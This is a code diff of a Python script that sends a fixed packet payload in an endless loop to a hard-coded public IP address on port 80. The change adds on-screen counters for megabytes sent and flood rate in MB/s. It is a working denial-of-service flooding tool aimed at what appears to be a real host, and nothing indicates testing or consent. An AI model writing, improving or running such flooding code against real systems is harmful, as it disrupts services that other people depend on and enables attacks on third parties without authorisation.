@@ -2,6 +2,7 @@ from datetime import datetime
 import socket
 import time
 import sys
+import os
 
 IPADDR = '5.158.91.59'
 PORTNUM = 80
@@ -19,9 +20,20 @@ def tryConnect():
        
 tryConnect()
         
-while True:
+start = time.time()
+
+totalSent = int(len(PACKETDATA))
+refresh_count = 0
+while True:    
     try:
         s.send(PACKETDATA)
-        print(f"Packet successfully sent, packet size: '{len(PACKETDATA)} bytes', sent at: '{datetime.now()}'")
+        if refresh_count == 2500:
+          os.system('clear')
+          trfic = round((totalSent / (time.time() - start) / 1000000), 1)
+          totalSentRound = round((totalSent) / 1000000, 1)
+          print(f"Sent: {totalSentRound} MB\nTraffic: {trfic} MB/s")
+          refresh_count = 0
+        totalSent = totalSent + int(len(PACKETDATA))
+        refresh_count = refresh_count + 1
     except Exception as ex:
         print(f"Excepted at: {datetime.now()} :: {type(ex)} :: Exception occured whilst trying to send UDP packet (BINARYDATA: '{PACKETDATA.decode()}',IP: '{IPADDR}', PORT: '{PORTNUM}', ERROR: '{ex}', EXCEPTION ARGS: '{ex.args}')")
